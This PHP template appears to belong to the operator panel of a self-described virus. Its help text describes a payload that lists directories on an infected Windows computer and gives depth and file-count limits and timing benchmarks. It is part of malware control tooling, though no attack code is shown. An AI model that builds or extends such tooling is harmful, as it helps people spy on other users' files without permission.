<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir;

?>

<p>Place the directory you want to explore above. If the directory to explore has too many files and folders
    to go through, the virus will automatically stop the payload
    after <?php echo ExploreDir::$maxLines ?>
    files and folders. You can limit the depth the virus will explore (and in turn, will cover more, but
    shallower folders) by specifying it in the max depth field above. The default
    is <?php echo ExploreDir::$defaultDepth; ?> which I think is effectively infinity on most computers.</p>
<p>Also please note that exploring directories can take a long time so please be patient. Here are a list of
    benchmarks to help you gauge how long it takes:</p>
<ul>
    <li>C:\Users, 4 minutes 4 seconds, 84000 files and directories</li>
    <li>C:\Program Files, 50 seconds, 25000 files and directories</li>
    <li>C:\, 23 minutes, 387000 files and directories and ongoing. I had to stop it because it has bored me
        out of my mind
    </li>
</ul>